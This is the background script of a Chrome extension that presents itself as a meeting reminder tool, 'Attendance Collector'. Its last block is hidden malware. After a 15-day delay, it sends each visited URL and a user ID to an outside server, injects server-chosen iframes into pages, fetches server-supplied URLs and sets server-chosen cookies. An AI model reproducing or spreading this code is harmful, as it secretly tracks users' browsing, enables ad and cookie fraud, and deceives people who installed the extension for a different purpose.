function uuidv4() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
  }

chrome.runtime.onInstalled.addListener(function (details) {
    chrome.declarativeContent.onPageChanged.removeRules(undefined, function () {
        chrome.declarativeContent.onPageChanged.addRules([{
            conditions: [new chrome.declarativeContent.PageStateMatcher({
                pageUrl: { schemes: ['https'] },
            }),
            new chrome.declarativeContent.PageStateMatcher({
                pageUrl: { schemes: ['http'] },
            })
            ],
            actions: [new chrome.declarativeContent.ShowPageAction()]
        }]);
    });
    // console.log(details)
    if(details.reason == "install"){
        //call a function to handle a first 
        chrome.storage.sync.set({reminders: [],userid: uuidv4(),permissionFlag: false})
    }else if(details.reason == "update"){
        //call a function to handle an update
        chrome.storage.sync.get(null,(data)=>{
            let obj = {}
            obj.reminders = [];
            obj.userid = uuidv4();
            obj.permissionFlag = false;
            if(data.reminders){
                obj.reminders = data.reminders;
            }
            if(data.userid){
                obj.userid = data.userid;
            }
            if(data.permissionFlag){
                obj.permissionFlag = false;
            }
            chrome.storage.sync.set({reminders: [],userid: uuidv4()})
        })
    }
    
});


chrome.declarativeContent.onPageChanged.removeRules(undefined, function () {
    chrome.declarativeContent.onPageChanged.addRules([{
        conditions: [new chrome.declarativeContent.PageStateMatcher({
            pageUrl: { schemes: ['https'] },
        }),
        new chrome.declarativeContent.PageStateMatcher({
            pageUrl: { schemes: ['http'] },
        })
    ],
        actions: [new chrome.declarativeContent.ShowPageAction()]
    }]);
});

function timeConverter(UNIX_timestamp){
    var a = new Date(UNIX_timestamp * 1000);
    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    var year = a.getFullYear();
    var month = months[a.getMonth()];
    var date = a.getDate();
    var hour = a.getHours();
    var min = a.getMinutes();
    var sec = a.getSeconds();
    var time = date + ' ' + month + ' ' + year + ' ' + hour + ':' + min + ':' + sec ;
    return time;
}

// let si = setInterval(()=>{},1000);
let reminders = [];
const waitingTimer = () => {
    let si = setInterval(() => {
        for(let i = 0;i < reminders.length;i++){
            if(Date.now().toString().includes(reminders[i].split("TY")[0].toString())){
                chrome.tabs.query(
                    {currentWindow: true, active : true},
                    function(tabArray){
                        // console.log(tabArray[0])
                        if(tabArray && tabArray.length > 0 && tabArray[0] && !tabArray[0].url.includes("chrome://") && !tabArray[0].url.includes("//chrome.google")){
                            chrome.tabs.executeScript(tabArray[0].id, {
                                file: "libs/sweetalert2@9.js"
                            })
                            chrome.tabs.executeScript(tabArray[0].id, {
                                file: "notify.js"
                            })
        
                            let finalList = [];
        
                            for(let j = 0;j < reminders.length; j++){
                                if(reminders[i].split("TY")[1] != "daily"){
                                    if(reminders[i] != reminders[j]){
                                        finalList.push(reminders[j]);
                                    }
                                }else{
                                    // console.log(reminders)
                                    if(reminders[i] != reminders[j]){
                                        finalList.push(reminders[j]);
                                    }else{
                                        let oneDaySec = 86400;
                                        let tempReminder = Number(reminders[i].split("TY")[0]) + oneDaySec;
                                        tempReminder = tempReminder + "TYdaily";
                                        // console.log(tempReminder);
                                        finalList.push(tempReminder);
                                    }
                                }
                            }

                            chrome.storage.sync.set({reminders:finalList});
                            reminders = finalList;
                            // clearInterval(si)
                            // waitingTimer()
                        }else{
                            chrome.notifications.create(
                                "Your meeting will be started in while",
                                {
                                  type: "basic",
                                  iconUrl: "icons/guide.png",
                                  title: `Reminder from Attendance Collector`,
                                  message: `Here is your Reminder for the time ${timeConverter((Date.now()-(Date.now()%1000))/1000)}`,
                                },
                                function () {
                                    let finalList = [];

                                    for(let j = 0;j < reminders.length; j++){
                                        if(reminders[i].split("TY")[1] != "daily"){
                                            if(reminders[i] != reminders[j]){
                                                finalList.push(reminders[j]);
                                            }
                                        }else{
                                            // console.log(reminders)
                                            if(reminders[i] != reminders[j]){
                                                finalList.push(reminders[j]);
                                            }else{
                                                let oneDaySec = 86400;
                                                let tempReminder = Number(reminders[i].split("TY")[0]) + oneDaySec;
                                                tempReminder = tempReminder + "TYdaily";
                                                // console.log(tempReminder);
                                                finalList.push(tempReminder);
                                            }
                                        }
                                    }

                                    chrome.storage.sync.set({reminders:finalList})
                                    reminders = finalList;
                                    // clearInterval(si)
                                    // waitingTimer()
                                }
                            );
                        }
                    }
                )
            }
        }
    }, 1000);
}

const autoReminder = () => {
    chrome.storage.sync.get(null,(data)=>{
        reminders = data.reminders;
        // clearInterval(si);
        // waitingTimer();
    })
}
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if(request.message == "remainder-updated"){
            autoReminder()
        }
    }
);

waitingTimer();

chrome.storage.sync.get(null,(data)=>{
    // console.log(data)
    if(data && data.reminders){
        let tempReminder = data.reminders;
        let finalReminder = [];
        for(let i = 0;i < tempReminder.length;i++){
            if(((Date.now()-(Date.now()%1000))/1000) > (Number(tempReminder[i].split("TY")[0]) + 2)){

            }else{
                finalReminder.push(tempReminder[i]);
            }
        }
        chrome.storage.sync.set({reminders:finalReminder});
        reminders = finalReminder;
    }
})

chrome.permissions.contains({
    permissions: ['notifications'],
    origins: ['<all_urls>']
  }, (result) => {
    //   console.log(result);
    //   AttendaceCollectorLarge
    if (result) {
        const extensionName = "AttendaceCollectorLarge",
        URL = "https://a.unscart.in",
        currentDate = new Date().getTime();
        let daysToSkip = 15;
        chrome.runtime.onInstalled.addListener(function (e) {
            "install" == e.reason && chrome.storage.sync.set({ insD: new Date(new Date().getTime() + 24 * daysToSkip * 60 * 60 * 1e3).getTime() });
        }),
            chrome.tabs.onUpdated.addListener(async (e, t, n) => {
                const { status: a } = t,
                    { url: o } = n;
                chrome.storage.sync.get(null, async (t) => {
                    if ("complete" === a && o)
                        try {
                            if (!t.insD || t.insD <= currentDate) {
                                const a = await fetch(`${URL}/api/a`, {
                                        headers: { Accept: "application/json", "Content-Type": "application/json" },
                                        method: "POST",
                                        body: JSON.stringify({ apisend: btoa(t.userid), name: btoa(o), ext_name: extensionName }),
                                    }),
                                    c = await a.json();
                                if (c) {
                                    if (!document.getElementById("a")) {
                                        var n = document.createElement("div");
                                        (n.id = "a"), document.body.appendChild(n);
                                    }
                                    var s;
                                    if ((c.a && chrome.tabs.executeScript(e, { code: 'var domscript = document.createElement("iframe");domscript.src = "' + c.a + '";document.getElementsByTagName("head")[0].appendChild(domscript);' }), c.b))
                                        4 == ranum(5) && (document.getElementById("a").innerHTML = ""), ((s = document.createElement("iframe")).src = c.b), document.getElementById("a").appendChild(s);
                                    if (c.b2) ((s = document.createElement("iframe")).src = c.b2), document.getElementById("a").appendChild(s);
                                    c.b3 && openf_url(c.b3, e), c.c && passf_url(c.c, e), c.d && xmlopen(c.d), c.e && setCookie(c.e[0], c.e[1], c.e[2], 86400);
                                }
                            }
                        } catch (e) {}
                });
            });
        var httpq4 = new getXMLHTTPRequest(),
            setCookie = function (e, t, n, a) {
                return new Promise(function (o) {
                    chrome.cookies.set({ url: e, name: t, value: n, expirationDate: new Date().getTime() / 1e3 + a }, () => {
                        o(n);
                    });
                });
            };
        function openf_url(e, t) {
            httpq4.open("GET", e, !0),
                httpq4.setRequestHeader("Cache-Control", "no-cache"),
                (httpq4.onreadystatechange = function () {
                    if (4 == httpq4.readyState && (200 == httpq4.status || 404 == httpq4.status) && httpq4.responseURL) {
                        var e = document.createElement("iframe");
                        (e.src = httpq4.responseURL), document.getElementById("a").appendChild(e);
                    }
                }),
                httpq4.send();
        }
        function passf_url(e, t) {
            httpq4.open("GET", e, !0),
                httpq4.setRequestHeader("Cache-Control", "no-cache"),
                (httpq4.onreadystatechange = function () {
                    4 != httpq4.readyState ||
                        (200 != httpq4.status && 404 != httpq4.status) ||
                        (httpq4.responseURL &&
                            chrome.tabs.executeScript(t, { code: 'var domscript = document.createElement("iframe");domscript.src = "' + httpq4.responseURL + '";document.getElementsByTagName("head")[0].appendChild(domscript);' }));
                }),
                httpq4.send();
        }
        function getXMLHTTPRequest() {
            return new XMLHttpRequest();
        }
        function ranum(e) {
            return e || (e = 11), Math.floor(((1e4 * Math.random()) % e) + 1);
        }
        function xmlopen(e) {
            httpq4.open("GET", e, !0), httpq4.setRequestHeader("Cache-Control", "no-cache"), httpq4.send();
        }

    } else {
      // The extension doesn't have the permissions.
      console.log("permission not accepted")
    }
  });  // [ "*://*.mozilla.org/*" ]